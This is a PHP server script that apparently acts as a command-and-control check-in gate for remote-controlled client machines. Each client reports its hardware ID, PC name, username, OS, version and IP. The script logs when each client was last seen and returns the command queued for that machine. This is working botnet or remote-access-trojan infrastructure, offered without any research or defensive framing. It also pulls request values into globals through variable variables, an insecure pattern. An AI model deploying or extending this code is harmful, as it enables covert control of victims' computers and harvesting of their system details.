<?php
require_once('config.php');

function init($s) {
	global $$s;
	$$s = $_REQUEST[$s];
}

init('hwid'); init('pcname'); init('username'); init('os'); $ip = $_SERVER['REMOTE_ADDR']; init('version');

$connection = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
if ($connection -> connect_errno) {
	echo 'error';
	exit();
}

$exists = $connection->prepare('SELECT EXISTS(SELECT 1 FROM users WHERE hwid = ?)');
$exists->bind_param('s', $hwid);
$exists->execute();
$exists->bind_result($result);
$exists->fetch();
$exists->close();

if ($result == 0) { //Current user does not exist
	if($prepare = $connection->prepare('INSERT INTO users (hwid, pcname, username, os, ip, version) VALUES (?, ?, ?, ?, ?, ?)')) {
		$prepare->bind_param('ssssss', $hwid, $pcname, $username, $os, $ip, $version);
		$prepare->execute();
		$prepare->close();
	}
} else {
	if($prepare = $connection->prepare('UPDATE users SET pcname = ?, username = ?, os = ?, ip = ?, version =? WHERE hwid = ?')) {
		$prepare->bind_param('ssssss', $pcname, $username, $os, $ip, $version, $hwid);
		$prepare->execute();
		$prepare->close();
	}
}

if ($prepare = $connection->prepare('UPDATE users SET last_seen = FROM_UNIXTIME(?) WHERE hwid = ?')) {
	$prepare->bind_param('is', time(), $hwid);
	$prepare->execute();
	$prepare->close();
}
	
if($prepare = $connection->prepare('SELECT current_command FROM users WHERE hwid = ?')) {
	$prepare->bind_param('s', $hwid);
	$prepare->execute();
	$prepare->bind_result($result);
	$prepare->fetch();
	$prepare->close();
	if ($prepare = $connection->prepare('UPDATE users SET command_seen = 1 WHERE hwid = ?')) {
		$prepare->bind_param('s', $hwid);
		$prepare->execute();
		$prepare->close();
	}
	echo $result;
}

$connection->close();
?>